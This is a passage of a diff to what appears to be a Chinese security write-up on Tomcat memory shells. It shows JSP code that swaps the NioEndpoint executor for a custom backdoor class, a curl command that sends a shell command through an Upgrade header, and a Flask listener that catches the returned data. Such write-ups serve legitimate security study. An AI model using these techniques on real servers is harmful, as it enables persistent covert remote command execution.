+    NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
+    ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
+    threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
+    nioEndpoint.setExecutor(exe);
 %>
 
 
@@ -1583,21 +1583,21 @@ curl -H "Connection: Upgrade" -H "Upgrade: hello" -H "cmd: dir" http://localhost
 当然，用`yakit`自带的这个是有缺陷的，就是不能持续接受，因为不能返回自定义的状态码，因此我们可以`python`自己写一个：
 
 ```
-from flask import Flask, request
+from flask import Flask, request
 
-app = Flask(__name__)
+app = Flask(__name__)
 
-@app.route('/postendpoint', methods=['POST'])
-def handle_post_request():
-    if request.method == 'POST':
-        if request.data:
-            print("Received data:", request.data.decode())
-            return '', 200
-        else:
-            return 'No data received', 400
+@app.route('/postendpoint', methods=['POST'])
+def handle_post_request():
+    if request.method == 'POST':
+        if request.data:
+            print("Received data:", request.data.decode())
+            return '', 200
+        else:
+            return 'No data received', 400
 
-if __name__ == '__main__':
-    app.run(debug=True)
+if __name__ == '__main__':
+    app.run(debug=True)
 
 
 ```
